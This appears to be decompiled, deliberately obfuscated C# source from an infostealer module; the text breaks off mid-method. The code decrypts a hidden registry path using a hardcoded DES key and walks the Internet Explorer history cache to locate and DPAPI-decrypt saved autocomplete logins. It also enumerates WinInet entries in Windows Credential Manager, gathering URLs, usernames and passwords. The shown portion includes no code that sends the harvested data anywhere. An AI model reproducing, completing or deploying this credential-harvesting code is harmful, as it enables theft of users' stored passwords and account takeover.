using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class Class0 : IEnumerable, IEnumerator
{
	private struct Struct0
	{
		public int dwLowDateTime;

		public int dwHighDateTime;
	}

	private struct BeqpP6Le9
	{
		public int cbData;

		public int pbData;
	}

	private struct CnBLKpyY13
	{
		public int lpstrKeyword;

		public int dwFlags;

		public int dwValueSize;

		public int lpbValue;
	}

	private enum cRJ8bjZS12
	{
		GENERIC = 1,
		DOMAIN_PASSWORD,
		DOMAIN_CERTIFICATE,
		DOMAIN_VISIBLE_PASSWORD,
		MAXIMUM
	}

	private struct DtDvy9YR8
	{
		public int dwStructSize;

		public int lpszSourceUrlName;

		public int lpszLocalFileName;

		public int CacheEntryType;

		public int dwUseCount;

		public int dwHitRate;

		public int dwSizeLow;

		public int dwSizeHigh;

		public Struct0 LastModifiedTime;

		public Struct0 ExpireTime;

		public Struct0 LastAccessTime;

		public Struct0 LastSyncTime;

		public int lpHeaderInfo;

		public int dwHeaderInfoSize;

		public int lpszFileExtension;

		public int dwExemptDelta;
	}

	private struct lPfPwIjX14
	{
		public int dwFlags;

		public int dwType;

		public int lpstrTargetName;

		public int lpstrComment;

		public Struct0 ftLastWritten;

		public int dwCredentialBlobSize;

		public int lpbCredentialBlob;

		public int dwPersist;

		public int dwAttributeCount;

		public int lpAttributes;

		public int lpstrTargetAlias;

		public int lpUserName;
	}

	private struct QnvWq7e611
	{
		public int dwDataOffset;

		public Struct0 ftInsertDateTime;

		public int dwDataSize;
	}

	private struct snEaE1qu15
	{
		public string strUserName;

		public string strPassword;

		public string strURL;
	}

	private struct uavc9F1f10
	{
		public int dwWICK;

		public int dwStructSize;

		public int dwEntriesCount;

		public int dwUnkId;

		public int dwType;

		public int dwUnk;
	}

	private const int ERROR_CACHE_FIND_FAIL = 0;

	private const int ERROR_CACHE_FIND_SUCCESS = 1;

	private const int MAX_PATH = 260;

	private const int MAX_CACHE_ENTRY_INFO_SIZE = 4096;

	private const int NORMAL_CACHE_ENTRY = 1;

	private const int URLHISTORY_CACHE_ENTRY = 2097152;

	private const int PROV_RSA_FULL = 1;

	private const int ALG_CLASS_HASH = 32768;

	private const int ALG_TYPE_ANY = 0;

	private const int ALG_SID_SHA = 4;

	private const int CALG_SHA = 32772;

	private const int AT_SIGNATURE = 2;

	private const int HP_HASHVAL = 2;

	private const int READ_CONTROL = 131072;

	private const int STANDARD_RIGHTS_READ = 131072;

	private const int KEY_QUERY_VALUE = 1;

	private const int KEY_ENUMERATE_SUB_KEYS = 8;

	private const int KEY_NOTIFY = 16;

	private const int SYNCHRONIZE = 1048576;

	private const int STANDARD_RIGHTS_WRITE = 131072;

	private const int KEY_SET_VALUE = 2;

	private const int KEY_CREATE_SUB_KEY = 4;

	private const int KEY_READ = 131097;

	private const int KEY_WRITE = 131078;

	private const int HKEY_CURRENT_USER = -2147483647;

	private snEaE1qu15[] snEaE1qu15_0;

	private int int_0;

	public Class1 this[int Index]
	{
		get
		{
			if ((Index < 0) | (Index >= Count))
			{
				return null;
			}
			Class1 @class = new Class1();
			snEaE1qu15 snEaE1qu = snEaE1qu15_0[Index];
			@class.RGyaO32y3(ref snEaE1qu.strURL, ref snEaE1qu.strUserName, ref snEaE1qu.strPassword);
			return @class;
		}
	}

	public int Count
	{
		get
		{
			int try0000_dispatch = -1;
			int num2 = default(int);
			int num3 = default(int);
			int num = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						num3 = 0;
						num3 = checked(Information.UBound((Array)snEaE1qu15_0, 1) + 1);
						break;
					case 26:
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						default:
							goto IL_0050;
						}
						break;
					}
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 26;
					continue;
				}
				break;
				IL_0050:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			int result = num3;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}

	public object Current
	{
		get
		{
			Class1 @class = new Class1();
			int num = int_0;
			@class.RGyaO32y3(ref snEaE1qu15_0[num].strURL, ref snEaE1qu15_0[num].strUserName, ref snEaE1qu15_0[num].strPassword);
			checked
			{
				int_0++;
				return @class;
			}
		}
	}

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindFirstUrlCacheEntryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszUrlSearchPattern, IntPtr lpFirstCacheEntryInfo, ref int lpdwFirstCacheEntryInfoBufferSize);

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindNextUrlCacheEntryA(int hEnum, IntPtr lpFirstCacheEntryInfo, ref int lpdwFirstCacheEntryInfoBufferSize);

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindCloseUrlCache(int hEnumHandle);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lstrlenA(IntPtr lpString);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lstrcpyA([MarshalAs(UnmanagedType.VBByRefStr)] ref string RetVal, int ptr);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptAcquireContextA(ref int phProv, int pszContainer, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszProvider, int dwProvType, int dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptCreateHash(int hProv, int Algid, int hKey, int dwFlags, ref int phHash);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptHashData(int hHash, IntPtr pbData, int dwDataLen, int dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptGetHashParam(int hHash, int dwParam, IntPtr pByte, ref int pdwDataLen, int dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptGetHashParam", ExactSpelling = true, SetLastError = true)]
	private static extern int CryptGetHashParam_1(int hHash, int dwParam, [MarshalAs(UnmanagedType.LPArray, SizeConst = 0)] ref byte[] pByte, ref int pdwDataLen, int dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptSignHashA(int hHash, int dwKeySpec, int sDescription, int dwFlags, int pbSignature, ref int pdwSigLen);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptDestroyHash(int hHash);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptReleaseContext(int hProv, int dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegOpenKeyExA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey, int ulOptions, int samDesired, ref int phkResult);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName, int lpReserved, ref int lpType, IntPtr lpData, ref int lpcbData);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegDeleteValueA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LocalFree(int hMem);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegCloseKey(int hKey);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData(ref BeqpP6Le9 pDataIn, int ppszDataDescr, IntPtr pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref BeqpP6Le9 pDataOut);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptUnprotectData", ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData_1(ref BeqpP6Le9 pDataIn, int ppszDataDescr, ref BeqpP6Le9 pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref BeqpP6Le9 pDataOut);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW([MarshalAs(UnmanagedType.LPWStr)] string lpszFilter, int lFlags, ref int pCount, ref int lppCredentials);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredDeleteW([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredFree(int pBuffer);

	[DllImport("oleaut32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern string SysAllocString(int pOlechar);

	private string tc2jazAU28(IntPtr lpszA)
	{
		return Marshal.PtrToStringAnsi(lpszA);
	}

	private byte VIRcT7TZ29(ref string s)
	{
		int num = 0;
		int num2 = Strings.Len(s);
		checked
		{
			for (int i = 1; i <= num2; i += 2)
			{
				num += (int)Math.Round(Conversion.Val("&H" + Strings.Mid(s, i, 2)));
			}
			return (byte)unchecked(num % 256);
		}
	}

	private string RNEBGrKm30(ref byte[] pbData)
	{
		checked
		{
			pbData = (byte[])Utils.CopyArray((Array)pbData, (Array)new byte[pbData.Length + 1 + 1]);
			byte[] array = SHA1.Create().ComputeHash(pbData);
			string text = "";
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text += Strings.Right("00" + Conversion.Hex(array[i]), 2);
			}
			return text;
		}
	}

	private void yzu63HAJ31(ref string strURL, ref string strHash, ref BeqpP6Le9 dataOut)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		IntPtr intPtr = default(IntPtr);
		QnvWq7e611 qnvWq7e = default(QnvWq7e611);
		int num5 = default(int);
		int num6 = default(int);
		uavc9F1f10 uavc9F1f = default(uavc9F1f10);
		IntPtr ptr2 = default(IntPtr);
		uavc9F1f10 uavc9F1f2 = default(uavc9F1f10);
		string strPassword = default(string);
		int dwEntriesCount = default(int);
		int num7 = default(int);
		IntPtr intPtr2 = default(IntPtr);
		QnvWq7e611 qnvWq7e2 = default(QnvWq7e611);
		int num8 = default(int);
		string strUserName = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int pbData;
					object? obj;
					object? obj2;
					IntPtr ptr;
					IntPtr lpString;
					object? obj3;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0008;
					case 996:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_000e;
							case 4:
								goto IL_001f;
							case 5:
								goto IL_0028;
							case 6:
								goto IL_0037;
							case 7:
								goto IL_0046;
							case 8:
								goto IL_006b;
							case 9:
								goto IL_0093;
							case 10:
								goto IL_00a4;
							case 11:
								goto IL_00bd;
							case 12:
								goto IL_00d7;
							case 13:
								goto IL_00ee;
							case 15:
							case 16:
								goto IL_0110;
							case 17:
								goto IL_0139;
							case 18:
								goto IL_0163;
							case 20:
								goto IL_018b;
							case 21:
								goto IL_018f;
							case 24:
								goto IL_01b7;
							case 25:
								goto IL_01e0;
							case 26:
								goto IL_01f2;
							case 27:
								goto IL_021c;
							case 29:
								goto IL_0241;
							case 30:
								goto IL_0245;
							case 28:
							case 31:
							case 32:
								goto IL_0268;
							case 33:
							case 35:
								goto IL_0290;
							case 36:
								goto IL_0298;
							case 37:
								goto IL_02b0;
							case 38:
								goto IL_02c8;
							case 39:
							case 40:
								goto IL_02e0;
							case 19:
							case 22:
							case 23:
								goto IL_02ef;
							case 41:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 14:
							case 42:
							case 43:
							case 44:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_01f2:
						num = 26;
						lpString = new IntPtr(intPtr.ToInt32() + qnvWq7e.dwDataOffset);
						if (lstrlenA(lpString) != qnvWq7e.dwDataSize)
						{
							goto IL_021c;
						}
						goto IL_0241;
						IL_0008:
						num = 2;
						num5 = -1;
						goto IL_000e;
						IL_000e:
						num = 3;
						num5 = Information.UBound((Array)snEaE1qu15_0, 1);
						goto IL_001f;
						IL_001f:
						num = 4;
						num5++;
						goto IL_0028;
						IL_0028:
						num = 5;
						num6 = Strings.Len((object)qnvWq7e);
						goto IL_0037;
						IL_0037:
						num = 6;
						Strings.Len((object)uavc9F1f);
						goto IL_0046;
						IL_0046:
						num = 7;
						pbData = dataOut.pbData;
						ptr = new IntPtr(dataOut.pbData);
						ptr2 = new IntPtr(pbData + unchecked((int)Marshal.ReadByte(ptr)));
						goto IL_006b;
						IL_006b:
						num = 8;
						obj = Marshal.PtrToStructure(ptr2, uavc9F1f.GetType());
						uavc9F1f = ((obj != null) ? ((uavc9F1f10)obj) : uavc9F1f2);
						goto IL_0093;
						IL_0241:
						num = 29;
						goto IL_0245;
						IL_0245:
						num = 30;
						lpString = new IntPtr(intPtr.ToInt32() + qnvWq7e.dwDataOffset);
						strPassword = Marshal.PtrToStringAnsi(lpString);
						goto IL_0268;
						IL_021c:
						num = 27;
						ptr = new IntPtr(intPtr.ToInt32() + qnvWq7e.dwDataOffset);
						strPassword = Marshal.PtrToStringUni(ptr);
						goto IL_0268;
						IL_0093:
						num = 9;
						if (uavc9F1f.dwType != 1)
						{
							goto end_IL_0000_3;
						}
						goto IL_00a4;
						IL_00a4:
						num = 10;
						dwEntriesCount = uavc9F1f.dwEntriesCount;
						num7 = 1;
						goto IL_00b4;
						IL_00b4:
						if (num7 > dwEntriesCount)
						{
							break;
						}
						goto IL_00bd;
						IL_00bd:
						num = 11;
						intPtr2 = new IntPtr(ptr2.ToInt32() + uavc9F1f.dwStructSize);
						goto IL_00d7;
						IL_00d7:
						num = 12;
						intPtr = new IntPtr(intPtr2.ToInt32() + num7 * num6);
						goto IL_00ee;
						IL_00ee:
						num = 13;
						if ((intPtr == IntPtr.Zero) | (intPtr2 == IntPtr.Zero))
						{
							goto end_IL_0000_3;
						}
						goto IL_0110;
						IL_0110:
						num = 16;
						obj2 = Marshal.PtrToStructure(intPtr2, qnvWq7e.GetType());
						qnvWq7e = ((obj2 != null) ? ((QnvWq7e611)obj2) : qnvWq7e2);
						goto IL_0139;
						IL_0290:
						num = 35;
						num8 = num5;
						goto IL_0298;
						IL_0298:
						num = 36;
						snEaE1qu15_0[num8].strURL = strURL;
						goto IL_02b0;
						IL_0268:
						num = 32;
						snEaE1qu15_0 = (snEaE1qu15[])Utils.CopyArray((Array)snEaE1qu15_0, (Array)new snEaE1qu15[num5 + 1]);
						goto IL_0290;
						IL_0139:
						num = 17;
						lpString = new IntPtr(intPtr.ToInt32() + qnvWq7e.dwDataOffset);
						if (lstrlenA(lpString) != qnvWq7e.dwDataSize)
						{
							goto IL_0163;
						}
						goto IL_018b;
						IL_0163:
						num = 18;
						ptr = new IntPtr(intPtr.ToInt32() + qnvWq7e.dwDataOffset);
						strUserName = Marshal.PtrToStringUni(ptr);
						goto IL_02ef;
						IL_018b:
						num = 20;
						goto IL_018f;
						IL_018f:
						num = 21;
						lpString = new IntPtr(intPtr.ToInt32() + qnvWq7e.dwDataOffset);
						strUserName = Marshal.PtrToStringAnsi(lpString);
						goto IL_02ef;
						IL_02ef:
						num = 23;
						intPtr2 = new IntPtr(intPtr2.ToInt32() + num6);
						goto IL_01b7;
						IL_01b7:
						num = 24;
						obj3 = Marshal.PtrToStructure(intPtr2, qnvWq7e.GetType());
						qnvWq7e = ((obj3 != null) ? ((QnvWq7e611)obj3) : qnvWq7e2);
						goto IL_01e0;
						IL_02c8:
						num = 38;
						snEaE1qu15_0[num8].strPassword = strPassword;
						goto IL_02e0;
						IL_02e0:
						num = 40;
						num7++;
						goto IL_00b4;
						IL_02b0:
						num = 37;
						snEaE1qu15_0[num8].strUserName = strUserName;
						goto IL_02c8;
						IL_01e0:
						num = 25;
						strPassword = Strings.Space(qnvWq7e.dwDataSize);
						goto IL_01f2;
						end_IL_0000_2:
						break;
					}
					num = 41;
					if (uavc9F1f.dwEntriesCount != 2)
					{
					}
					break;
				}
				end_IL_0000:;
			}
			catch (object obj4) when (obj4 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj4);
				try0000_dispatch = 996;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Rwv4ajL332(string strRess, int hKey)
	{
		string[] array = strRess.Split(new char[1] { '?' });
		checked
		{
			string[] array2 = new string[6]
			{
				strRess,
				array[0].ToString(),
				array[0].ToString().Remove(array[0].Length - 1),
				array[0].ToString() + "/",
				array[0].Replace("index.php", "").ToString(),
				array[0].Replace("index.php", "").ToString() + "/"
			};
			int num = 0;
			string[] array3 = array2;
			int lpType = default(int);
			int lpcbData = default(int);
			BeqpP6Le9 pDataIn = default(BeqpP6Le9);
			BeqpP6Le9 pOptionalEntropy = default(BeqpP6Le9);
			BeqpP6Le9 pDataOut = default(BeqpP6Le9);
			for (int i = 0; i < array3.Length; i++)
			{
				string text = array3[i];
				if (num == 0)
				{
					text = Strings.LCase(text);
					byte[] pbData = Encoding.Unicode.GetBytes(text);
					string s = RNEBGrKm30(ref pbData);
					s += Strings.Right("00" + Conversion.Hex(VIRcT7TZ29(ref s)), 2);
					RegQueryValueExA(hKey, ref s, 0, ref lpType, IntPtr.Zero, ref lpcbData);
					if (lpcbData > 0)
					{
						IntPtr lpData = Marshal.AllocHGlobal(lpcbData);
						RegQueryValueExA(hKey, ref s, 0, ref lpType, lpData, ref lpcbData);
						pDataIn.cbData = lpcbData;
						pDataIn.pbData = lpData.ToInt32();
						pOptionalEntropy.cbData = Strings.Len(text) * 2 + 2;
						pOptionalEntropy.pbData = Marshal.StringToHGlobalUni(text).ToInt32();
						CryptUnprotectData_1(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
						yzu63HAJ31(ref text, ref s, ref pDataOut);
						num = 1;
						IntPtr hglobal = new IntPtr(pOptionalEntropy.pbData);
						Marshal.FreeHGlobal(hglobal);
						LocalFree(pDataOut.pbData);
					}
				}
			}
		}
	}

	protected string msryxatn33(IntPtr ptr)
	{
		return Marshal.PtrToStringUni(ptr);
	}

	private string method_0(string strText, string sDecrKey)
	{
		try
		{
			byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
			byte[] array = new byte[checked(strText.Length + 1)];
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			array = Convert.FromBase64String(strText);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			Encoding uTF = Encoding.UTF8;
			return uTF.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void rFLB4uRd35()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		int phkResult = default(int);
		int num6 = default(int);
		int lpdwFirstCacheEntryInfoBufferSize = default(int);
		IntPtr intPtr = default(IntPtr);
		DtDvy9YR8 dtDvy9YR = default(DtDvy9YR8);
		DtDvy9YR8 dtDvy9YR2 = default(DtDvy9YR8);
		int num7 = default(int);
		string text = default(string);
		string text2 = default(string);
		int num8 = default(int);
		string lpszFilter = default(string);
		int pCount = default(int);
		int lppCredentials = default(int);
		int num10 = default(int);
		int num11 = default(int);
		lPfPwIjX14 lPfPwIjX = default(lPfPwIjX14);
		lPfPwIjX14 lPfPwIjX2 = default(lPfPwIjX14);
		BeqpP6Le9 pDataOut = default(BeqpP6Le9);
		BeqpP6Le9 pOptionalEntropy = default(BeqpP6Le9);
		string text3 = default(string);
		int num12 = default(int);
		BeqpP6Le9 pDataIn = default(BeqpP6Le9);
		string text4 = default(string);
		string[] array = default(string[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					string lpSubKey;
					object? obj;
					int num9;
					object? obj2;
					IntPtr lpszA;
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						snEaE1qu15_0 = null;
						goto IL_000a;
					case 1563:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_0034;
							case 4:
								goto IL_003f;
							case 5:
								goto IL_0055;
							case 6:
								goto IL_0060;
							case 7:
								goto IL_006c;
							case 8:
								goto IL_0078;
							case 9:
							case 10:
								goto IL_008b;
							case 11:
								goto IL_00b2;
							case 12:
								goto IL_00cd;
							case 13:
								goto IL_00e9;
							case 14:
								goto IL_00fd;
							case 16:
								goto IL_0121;
							case 17:
								goto IL_0125;
							case 21:
								goto IL_0135;
							case 22:
								goto IL_0148;
							case 23:
								goto IL_0153;
							case 24:
								goto IL_015c;
							case 25:
								goto IL_0169;
							case 26:
							case 27:
								goto IL_0176;
							case 15:
							case 18:
							case 19:
							case 20:
								goto IL_0195;
							case 28:
								goto IL_019e;
							case 29:
							case 30:
								goto IL_01aa;
							case 31:
							case 32:
								goto IL_01b6;
							case 33:
								goto IL_01be;
							case 34:
								goto IL_01c5;
							case 35:
								goto IL_01d7;
							case 36:
								goto IL_01e1;
							case 37:
								goto IL_01ec;
							case 38:
								goto IL_01fd;
							case 39:
								goto IL_0201;
							case 40:
								goto IL_020d;
							case 41:
							case 43:
								goto IL_023a;
							case 44:
								goto IL_0254;
							case 45:
								goto IL_0272;
							case 46:
								goto IL_029b;
							case 47:
								goto IL_02b7;
							case 48:
								goto IL_02c4;
							case 49:
								goto IL_02d1;
							case 50:
								goto IL_02dc;
							case 52:
								goto IL_02e5;
							case 51:
								goto IL_02f5;
							case 53:
								goto IL_031a;
							case 54:
								goto IL_032c;
							case 55:
								goto IL_033e;
							case 56:
								goto IL_0350;
							case 57:
								goto IL_035c;
							case 58:
								goto IL_0368;
							case 59:
								goto IL_037c;
							case 60:
								goto IL_0387;
							case 61:
								goto IL_03a2;
							case 62:
								goto IL_03b6;
							case 63:
								goto IL_03d0;
							case 64:
							case 66:
								goto IL_03f8;
							case 67:
								goto IL_0400;
							case 68:
								goto IL_041a;
							case 69:
								goto IL_0434;
							case 70:
								goto IL_043d;
							case 72:
								goto IL_0462;
							case 73:
								goto IL_0466;
							case 77:
								goto IL_0487;
							case 71:
							case 74:
							case 75:
							case 76:
								goto IL_0496;
							case 78:
								goto IL_04a9;
							case 79:
							case 80:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 81:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0434:
						num = 69;
						if (num5 > 0)
						{
							goto IL_043d;
						}
						goto IL_0462;
						IL_000a:
						num = 2;
						lpSubKey = method_0("8DYu61PVOq2FZMLQdWt4Ix8n6kgw32ilA/MP20vcwqih2qZOxH49T8SLCxYzgZTy5ML3qgRrFn+5f8h85LMOqg==", "12345#$%");
						RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131097, ref phkResult);
						goto IL_0034;
						IL_0034:
						num = 3;
						if (phkResult != 0)
						{
							goto IL_003f;
						}
						goto IL_01b6;
						IL_003f:
						num = 4;
						lpSubKey = null;
						num6 = FindFirstUrlCacheEntryA(ref lpSubKey, IntPtr.Zero, ref lpdwFirstCacheEntryInfoBufferSize);
						goto IL_0055;
						IL_0055:
						num = 5;
						if (lpdwFirstCacheEntryInfoBufferSize > 0)
						{
							goto IL_0060;
						}
						goto IL_01aa;
						IL_0060:
						num = 6;
						intPtr = Marshal.AllocHGlobal(lpdwFirstCacheEntryInfoBufferSize);
						goto IL_006c;
						IL_006c:
						num = 7;
						Marshal.WriteInt32(intPtr, lpdwFirstCacheEntryInfoBufferSize);
						goto IL_0078;
						IL_0078:
						num = 8;
						lpSubKey = null;
						num6 = FindFirstUrlCacheEntryA(ref lpSubKey, intPtr, ref lpdwFirstCacheEntryInfoBufferSize);
						goto IL_008b;
						IL_008b:
						num = 10;
						obj = Marshal.PtrToStructure(intPtr, dtDvy9YR.GetType());
						dtDvy9YR = ((obj == null) ? dtDvy9YR2 : ((DtDvy9YR8)obj));
						goto IL_00b2;
						IL_0462:
						num = 72;
						goto IL_0466;
						IL_0466:
						num = 73;
						snEaE1qu15_0[num7].strURL = Strings.Mid(text, 19);
						goto IL_0496;
						IL_043d:
						num = 70;
						snEaE1qu15_0[num7].strURL = Strings.Mid(text, 19, num5 - 1);
						goto IL_0496;
						IL_00b2:
						num = 11;
						if ((dtDvy9YR.CacheEntryType & 0x200001) == 2097153)
						{
							goto IL_00cd;
						}
						goto IL_0195;
						IL_00cd:
						num = 12;
						lpszA = new IntPtr(dtDvy9YR.lpszSourceUrlName);
						text2 = tc2jazAU28(lpszA);
						goto IL_00e9;
						IL_00e9:
						num = 13;
						if (Strings.InStr(text2, "@", (CompareMethod)0) > 0)
						{
							goto IL_00fd;
						}
						goto IL_0121;
						IL_00fd:
						num = 14;
						Rwv4ajL332(Strings.Mid(text2, Strings.InStr(text2, "@", (CompareMethod)0) + 1), phkResult);
						goto IL_0195;
						IL_0121:
						num = 16;
						goto IL_0125;
						IL_0125:
						num = 17;
						Rwv4ajL332(text2, phkResult);
						goto IL_0195;
						IL_0195:
						num = 20;
						lpdwFirstCacheEntryInfoBufferSize = 0;
						goto IL_0135;
						IL_0135:
						num = 21;
						FindNextUrlCacheEntryA(num6, IntPtr.Zero, ref lpdwFirstCacheEntryInfoBufferSize);
						goto IL_0148;
						IL_0148:
						num = 22;
						Marshal.FreeHGlobal(intPtr);
						goto IL_0153;
						IL_0153:
						num = 23;
						if (lpdwFirstCacheEntryInfoBufferSize > 0)
						{
							goto IL_015c;
						}
						goto IL_0176;
						IL_015c:
						num = 24;
						intPtr = Marshal.AllocHGlobal(lpdwFirstCacheEntryInfoBufferSize);
						goto IL_0169;
						IL_0169:
						num = 25;
						Marshal.WriteInt32(intPtr, lpdwFirstCacheEntryInfoBufferSize);
						goto IL_0176;
						IL_0176:
						num = 27;
						if (FindNextUrlCacheEntryA(num6, intPtr, ref lpdwFirstCacheEntryInfoBufferSize) != 0)
						{
							goto IL_008b;
						}
						goto IL_019e;
						IL_019e:
						num = 28;
						FindCloseUrlCache(num6);
						goto IL_01aa;
						IL_01aa:
						num = 30;
						RegCloseKey(phkResult);
						goto IL_01b6;
						IL_01b6:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_01be;
						IL_01be:
						num = 33;
						num8 = -1;
						goto IL_01c5;
						IL_01c5:
						num = 34;
						num8 = Information.UBound((Array)snEaE1qu15_0, 1);
						goto IL_01d7;
						IL_01d7:
						num = 35;
						num8++;
						goto IL_01e1;
						IL_01e1:
						num = 36;
						lpszFilter = "Microsoft_WinInet_*";
						goto IL_01ec;
						IL_01ec:
						num = 37;
						CredEnumerateW(lpszFilter, 0, ref pCount, ref lppCredentials);
						goto IL_01fd;
						IL_01fd:
						num = 38;
						goto IL_0201;
						IL_0201:
						num = 39;
						if (pCount <= 0)
						{
							break;
						}
						goto IL_020d;
						IL_020d:
						num = 40;
						snEaE1qu15_0 = (snEaE1qu15[])Utils.CopyArray((Array)snEaE1qu15_0, (Array)new snEaE1qu15[num8 + pCount - 1 + 1]);
						goto IL_023a;
						IL_023a:
						num = 43;
						num9 = num8;
						num10 = num8 + pCount - 1;
						num11 = num9;
						goto IL_024b;
						IL_024b:
						if (num11 <= num10)
						{
							goto IL_0254;
						}
						goto IL_04a9;
						IL_0254:
						num = 44;
						lpszA = new IntPtr(lppCredentials + (num11 - num8) * 4);
						intPtr = Marshal.ReadIntPtr(lpszA);
						goto IL_0272;
						IL_0272:
						num = 45;
						obj2 = Marshal.PtrToStructure(intPtr, lPfPwIjX.GetType());
						lPfPwIjX = ((obj2 != null) ? ((lPfPwIjX14)obj2) : lPfPwIjX2);
						goto IL_029b;
						IL_0487:
						num = 77;
						num11++;
						goto IL_024b;
						IL_04a9:
						num = 78;
						num8 += pCount;
						break;
						IL_0496:
						num = 76;
						LocalFree(pDataOut.pbData);
						goto IL_0487;
						IL_029b:
						num = 46;
